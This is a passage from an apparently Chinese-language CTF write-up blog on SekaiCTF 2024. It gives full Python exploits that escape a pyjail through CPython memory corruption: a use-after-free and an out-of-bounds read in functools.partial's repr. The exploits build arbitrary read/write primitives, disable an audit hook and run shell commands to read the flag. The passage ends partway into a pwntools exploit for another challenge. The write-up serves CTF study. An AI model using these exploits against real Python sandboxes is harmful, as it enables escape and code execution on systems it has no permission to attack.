class="hljs-number">1</span>] = addrof(<span class="hljs-built_in">bytearray</span>)<br>    m[<span class="hljs-number">2</span>] = size<br>    m[<span class="hljs-number">5</span>] = addr<br>    x = m.tobytes()<br>    a[<span class="hljs-number">0</span>] = addrof(x) + <span class="hljs-number">32</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arb_read</span>(<span class="hljs-params">addr</span>):<br>    fake_bytearray(addr, <span class="hljs-number">8</span>)<br>    <span class="hljs-keyword">return</span> wrap(b[<span class="hljs-number">0</span>]).tolist().pop()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arb_write</span>(<span class="hljs-params">addr, value</span>):<br>    fake_bytearray(addr, <span class="hljs-number">8</span>)<br>    wrap(b[<span class="hljs-number">0</span>])[<span class="hljs-number">0</span>] = value<br><br>RUNTIME_OFFSET = <span class="hljs-number">0x654900</span><br>A_CONST_OFFSET = <span class="hljs-number">0x65D910</span><br><br>python_base = addrof(<span class="hljs-string">&#x27;a&#x27;</span>) - A_CONST_OFFSET<br>py_runtime = python_base + RUNTIME_OFFSET<br>arb_write(py_runtime + <span class="hljs-number">0xBF0</span> + <span class="hljs-number">8</span>, <span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">import</span> os<br>os.execv(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;cat /flag*&quot;</span>])<br><br><span class="hljs-comment"># EOF</span><br></code></pre></td></tr></table></figure><h3 id="è°ƒè¯•åˆ†æ-1"><a href="#è°ƒè¯•åˆ†æ-1" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><ul><li><p>è§¦å‘uafä¹‹å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">t = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;&#x27;</span>, (), &#123;<span class="hljs-string">&#x27;a&#x27;</span>: <span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x40</span>), <span class="hljs-string">&#x27;__ror__&#x27;</span>: rorfn, <span class="hljs-string">&#x27;__or__&#x27;</span>: orfn&#125;)<br>a, b = t.__dict__ | t()<br><br><span class="hljs-comment"># (PyByteArrayObject *) a-&gt;ob_bytes and</span><br><span class="hljs-comment"># (PyListObject *) b-&gt;ob_item now share the same memory</span><br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/map1.png" class title="map1"><img src="/2024/08/31/sekai2024jailwp/t_a.png" class title="t_a"><img src="/2024/08/31/sekai2024jailwp/a_memoryview.png" class title="a_memoryview"><img src="/2024/08/31/sekai2024jailwp/b_list.png" class title="b_list"></li><li><p>addrof</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">def <span class="hljs-title function_">addrof</span><span class="hljs-params">(obj)</span>:<br>    b[0] = obj<br>    <span class="hljs-keyword">return</span> a[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/map2.png" class title="map2"></li><li><p>fake_bytearray</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fake_bytearray</span>(<span class="hljs-params">addr, size</span>):<br>    m = wrap(<span class="hljs-built_in">bytearray</span>(<span class="hljs-number">0x100</span>))<br>    m[<span class="hljs-number">0</span>] = <span class="hljs-number">3</span> <span class="hljs-comment"># refcnt</span><br>    m[<span class="hljs-number">1</span>] = addrof(<span class="hljs-built_in">bytearray</span>)<br>    m[<span class="hljs-number">2</span>] = size<br>    m[<span class="hljs-number">5</span>] = addr<br>    x = m.tobytes()<br>    a[<span class="hljs-number">0</span>] = addrof(x) + <span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/map3.png" class title="map3"><img src="/2024/08/31/sekai2024jailwp/m_bytearray.png" class title="m_bytearray"><img src="/2024/08/31/sekai2024jailwp/m_memoryview.png" class title="m_memoryview"><img src="/2024/08/31/sekai2024jailwp/x_bytes.png" class title="x_bytes"><img src="/2024/08/31/sekai2024jailwp/fake_byte_array.png" class title="fake_byte_array"></li></ul><h2 id="åˆ©ç”¨partial-reprçš„indexè¶Šç•Œ"><a href="#åˆ©ç”¨partial-reprçš„indexè¶Šç•Œ" class="headerlink" title="åˆ©ç”¨partial_reprçš„indexè¶Šç•Œ"></a>åˆ©ç”¨partial_reprçš„indexè¶Šç•Œ</h2><h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># based on chilaxans functools exp</span><br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> partial<br><span class="hljs-keyword">import</span> sys<br><br>length = <span class="hljs-number">119</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_pair</span>():<br>    <span class="hljs-comment"># heap grooming</span><br>    <span class="hljs-comment"># returns tuple, bytearray pair where array exists directly after end of tuple</span><br>    fill = <span class="hljs-built_in">bytes</span>((length // <span class="hljs-number">2</span>) * <span class="hljs-built_in">tuple</span>.__itemsize__)<br>    r = <span class="hljs-built_in">range</span>((length // <span class="hljs-number">2</span>) - <span class="hljs-number">5</span>)  <span class="hljs-comment"># do these now so that we need less allocs later</span><br>    old = []  <span class="hljs-comment"># store failures to increase memory pressure</span><br>    t0 = <span class="hljs-built_in">tuple</span>(r)<br>    b0 = <span class="hljs-built_in">bytearray</span>(fill)<br>    t1 = <span class="hljs-built_in">tuple</span>(r)<br>    b1 = <span class="hljs-built_in">bytearray</span>(fill)<br>    t = <span class="hljs-built_in">tuple</span>(r)<br>    b = <span class="hljs-built_in">bytearray</span>(fill)<br>    <span class="hljs-keyword">return</span> t, b<br><br><br>p = partial(<span class="hljs-built_in">id</span>)<br><br>bytearray_mem = <span class="hljs-built_in">memoryview</span>(<span class="hljs-built_in">bytearray</span>(<span class="hljs-built_in">bytearray</span>.__basicsize__)).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>bytearray_mem[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># refcount</span><br>bytearray_mem[<span class="hljs-number">1</span>] = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">bytearray</span>.__call__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)  <span class="hljs-comment"># ob_type</span><br>bytearray_mem[<span class="hljs-number">2</span>] = (<span class="hljs-number">2</span> ** (<span class="hljs-built_in">tuple</span>.__itemsize__ * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>) // <span class="hljs-number">2</span>  <span class="hljs-comment"># ob_size</span><br>bytearray_mem = bytearray_mem.tobytes()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>:<br>    __slots__ = [<span class="hljs-string">&quot;value&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-built_in">memoryview</span>(self.value))<br><br><br>Fake_mem = <span class="hljs-built_in">memoryview</span>(<span class="hljs-built_in">bytearray</span>(Fake.__basicsize__)).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>Fake_mem[<span class="hljs-number">0</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># refcount</span><br>Fake_mem[<span class="hljs-number">1</span>] = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Fake.__call__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)  <span class="hljs-comment"># ob_type</span><br>Fake_mem[<span class="hljs-number">2</span>] = (<br>    <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;bytearray_mem.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">bytes</span>.__basicsize__ - <span class="hljs-number">1</span><br>)<br>Fake_mem = Fake_mem.tobytes()<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeirdRepr</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> b  <span class="hljs-comment"># otherwise it is freed after function and that causes more problems</span><br>        t, b = make_pair()<br>        p.__setstate__((<span class="hljs-built_in">id</span>, t, &#123;&#125;, &#123;&#125;))<br>        mem = <span class="hljs-built_in">memoryview</span>(b).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mem)):<br>            mem[i] = (<br>                <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Fake_mem.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                + <span class="hljs-built_in">bytes</span>.__basicsize__<br>                - <span class="hljs-number">1</span><br>            )<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Wack&quot;</span><br><br><br>p.__setstate__((<span class="hljs-built_in">id</span>, (WeirdRepr(),) * length, &#123;&#125;, &#123;&#125;))<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">repr</span>(p)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    mem = e.args[<span class="hljs-number">0</span>]<br><br><span class="hljs-keyword">import</span> sys<br><br>RUNTIME_OFFSET = <span class="hljs-number">0x654900</span><br>A_CONST_OFFSET = <span class="hljs-number">0x65D910</span><br><br>a_addr = <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;a&#x27;</span>.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br><br>python_base = a_addr - A_CONST_OFFSET<br>py_runtime = python_base + RUNTIME_OFFSET<br>ob_idx = py_runtime + <span class="hljs-number">0xBF0</span> + <span class="hljs-number">8</span><br><br>mem[ob_idx : ob_idx + <span class="hljs-number">8</span>] = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0</span>] * <span class="hljs-number">8</span>)<br><span class="hljs-keyword">import</span> os<br><br>os.system(<span class="hljs-string">&quot;cat /flag*.txt&quot;</span>)<br><span class="hljs-comment"># EOF</span><br></code></pre></td></tr></table></figure><h3 id="è°ƒè¯•åˆ†æ-2"><a href="#è°ƒè¯•åˆ†æ-2" class="headerlink" title="è°ƒè¯•åˆ†æ"></a>è°ƒè¯•åˆ†æ</h3><ul><li><p>reprç”¨äºè¿”å›ä¸€ä¸ªå¯¹è±¡çš„â€œå®˜æ–¹â€å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ï¼Œè‡ªå®šä¹‰å¯¹è±¡å¯ä»¥å®šä¹‰__repr__è‡ªå®šä¹‰å®ç°</p></li><li><p>functools.partialå¯ç”¨äºåŒ…è£…å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> partial<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fa</span>(<span class="hljs-params">a, b, c</span>):<br>    <span class="hljs-keyword">return</span> a + b + c<br><br>p = partial(fa, <span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure></li><li><p>partialçš„reprç”±partial_reprå‡½æ•°å®ç°ï¼Œæœ‰è¿™ä¹ˆä¸€éƒ¨åˆ†</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">assert (PyTuple_Check(pto-&gt;args));<br>n = PyTuple_GET_SIZE(pto-&gt;args);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>    Py_SETREF(arglist, PyUnicode_FromFormat(<span class="hljs-string">&quot;%U, %R&quot;</span>, arglist,<br>                                    PyTuple_GET_ITEM(pto-&gt;args, i)));<br>    <span class="hljs-keyword">if</span> (arglist == <span class="hljs-literal">NULL</span>)<br>        <span class="hljs-keyword">goto</span> done;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>éå†pto-&gt;argså…ƒç»„ï¼Œè·å–å…¶ä¸­çš„PyObject</li><li>PyUnicode_FromFormatä¼šé€’å½’è°ƒç”¨pto-&gt;args[i]çš„__repr__</li></ul></li></ul><p>å¦‚æœæ­¤æ—¶ä¿®æ”¹pto-&gt;argsï¼Œæ”¹ä¸ºä¸€ä¸ªæ›´å°çš„å…ƒç»„å°±ä¼šé€ æˆindexè¶Šç•Œ</p><ul><li><p>å…ˆåˆ©ç”¨bytearray_memä¼ªé€ ä¸€ä¸ªPyByteArrayObject</p><img src="/2024/08/31/sekai2024jailwp/bytearray_mem1.png" class title="bytearray_mem1"><img src="/2024/08/31/sekai2024jailwp/bytearray_mem2.png" class title="bytearray_mem2"></li><li><p>å†åˆ©ç”¨Fake_memä¼ªé€ ä¸€ä¸ªFake PyObject</p><img src="/2024/08/31/sekai2024jailwp/fake_mem1.png" class title="fake_mem1"><img src="/2024/08/31/sekai2024jailwp/fake_mem2.png" class title="fake_mem2"><ul><li><p>class Fakeçš„valueå±æ€§æ˜¯__slots__çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>:<br>    __slots__ = [<span class="hljs-string">&quot;value&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-built_in">memoryview</span>(self.value))<br></code></pre></td></tr></table></figure></li><li><p>è¿™ä¸ªå±æ€§ç›´æ¥å­˜å‚¨åœ¨PyObjectä¹‹å</p><img src="/2024/08/31/sekai2024jailwp/fake_mem3.png" class title="fake_mem3"></li></ul></li><li><p>functools.partialçš„__repr__ä½¿ç”¨partial_reprå®ç°ï¼Œ__setstate__ä½¿ç”¨partial_setstateå®ç°</p><ul><li><p>é¦–å…ˆå°†argså¡«æ»¡class WeirdReprï¼Œå¤§å°ä¸º119</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">p.__setstate__((<span class="hljs-built_in">id</span>, (WeirdRepr(),) * length, &#123;&#125;, &#123;&#125;))<br></code></pre></td></tr></table></figure><img src="/2024/08/31/sekai2024jailwp/fake_buffer0.png" class title="fake_buffer"></li><li><p>repr(p)æ—¶ä¼šè°ƒç”¨WeirdRepr.__repr__ï¼Œå°†argsæ”¹ä¸ºå¤§å°54çš„å…ƒç»„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_pair</span>():<br>    fill = <span class="hljs-built_in">bytes</span>((length // <span class="hljs-number">2</span>) * <span class="hljs-built_in">tuple</span>.__itemsize__)<br>    r = <span class="hljs-built_in">range</span>((length // <span class="hljs-number">2</span>) - <span class="hljs-number">5</span>)<br>    <br><span class="hljs-comment"># â€¦â€¦</span><br>    <br>    t = <span class="hljs-built_in">tuple</span>(r)<br>    b = <span class="hljs-built_in">bytearray</span>(fill)<br>    <span class="hljs-keyword">return</span> t, b<br></code></pre></td></tr></table></figure><ul><li><p>å…ƒç»„å†…å®¹ä¸ºPyLongObject 1 2 3 4â€¦â€¦</p><img src="/2024/08/31/sekai2024jailwp/fake_buffer1.png" class title="fake_buffer1"></li><li><p>è¿™ä¸ªå…ƒç»„ä¹‹åè·Ÿçš„å°±æ˜¯PyByteArrayObjectçš„buf</p><img src="/2024/08/31/sekai2024jailwp/fake_buffer2.png" class title="fake_buffer2"><p>è¿™éƒ¨åˆ†å†…å­˜ä¹‹åè¢«å¡«æ»¡äº†æŒ‡å‘Fake_memçš„æŒ‡é’ˆ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">WeirdRepr</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> b<br>        t, b = make_pair()<br>        p.__setstate__((<span class="hljs-built_in">id</span>, t, &#123;&#125;, &#123;&#125;))<br>        mem = <span class="hljs-built_in">memoryview</span>(b).cast(<span class="hljs-string">&quot;P&quot;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(mem)):<br>            mem[i] = (<br>                <span class="hljs-built_in">int</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;Fake_mem.__add__&#125;</span>&quot;</span>.split(<span class="hljs-string">&quot;0x&quot;</span>)[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>                + <span class="hljs-built_in">bytes</span>.__basicsize__<br>                - <span class="hljs-number">1</span><br>            )<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Wack&quot;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>å†å›åˆ°partial_reprï¼Œæ­¤æ—¶argså·²è¢«ä¿®æ”¹ï¼Œè¶Šç•Œå¯¹Fakeè°ƒç”¨__repr__</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Fake</span>:<br>    __slots__ = [<span class="hljs-string">&quot;value&quot;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-built_in">memoryview</span>(self.value))<br></code></pre></td></tr></table></figure><p>Fake.valueç»è¿‡ä¼ªé€ æŒ‡å‘fake bytearrayï¼Œé€šè¿‡try expectå°±è·å–åˆ°äº†è¿™ä¸ªob_sizeä¸º0x7fffffffffffffffçš„PyByteArrayObjectï¼Œå¯ä»¥å¯¹å†…å­˜è¿›è¡Œä»»æ„è¯»å†™</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">repr</span>(p)<br><span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>    mem = e.args[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>pyjail</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 sekaiCTF pwn wp part1</title>
    <link href="/2024/08/27/sekai2024pwnwp/"/>
    <url>/2024/08/27/sekai2024pwnwp/</url>
    
    <content type="html"><![CDATA[<p>æˆåŠŸè§£é”æˆå°±â€”â€”ä¸€ä¸ªæš‘å‡ä¸¤ä¸ªæœˆæ¯ä¸ªå‘¨æœ«éƒ½åœ¨æ‰“æ¯”èµ›</p><span id="more"></span><h1 id="Life-Simulator-2"><a href="#Life-Simulator-2" class="headerlink" title="Life Simulator 2"></a>Life Simulator 2</h1><p>æ“äº†ä¸€å¤©çš„ç±»å‹æ··æ·†</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg= <span class="hljs-keyword">lambda</span> name,data :p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><br>elf = ELF(<span class="hljs-string">&#x27;./life_simulator_2&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># debug()</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_company</span>(<span class="hljs-params">company_name, company_budget</span>):<br>    sl(<span class="hljs-string">&#x27;add_company &#123;&#125; &#123;&#125;&#x27;</span>.<span 